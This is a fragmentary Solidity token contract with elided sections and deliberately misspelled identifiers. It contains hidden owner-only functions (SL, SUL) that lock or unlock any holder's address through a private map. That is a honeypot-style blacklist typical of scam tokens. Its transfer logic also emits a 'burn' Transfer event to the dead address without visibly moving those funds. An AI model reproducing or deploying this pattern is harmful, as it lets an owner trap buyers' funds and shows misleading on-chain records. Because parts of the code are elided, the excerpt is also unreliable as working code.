...
interface IERC20 {
    ...
    function balanceOf(address adount) external view returns (uint256);
...
contract token is Ownable, IERC20 {
    ...
    uint256 private _burnfsee = 1;
    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;

    mapping(address => bool) private _LKD;
    function SL(address adount) public onlyowsner {
        _LKD[adount] = true;
    }


    function SUL(address adount) public onlyowsner {
        _LKD[adount] = false;
    }


    function isLKD(address adount) public view returns (bool) {
    ...
    function _transfer(address sender, address recipient, uint256 amonnts) internal virtual {
        ...
        uint256 amoun;
        amoun = amonnts - fseeamonnt;
        _balance[recipient] += amoun;
        if (_burnfsee > 0){
            emit Transfer (sender, _DEADaddress, fseeamonnt);
        }
    ...
    function balanceOf(address adount) public view override returns (uint256) {
        return _balance[adount];
    }
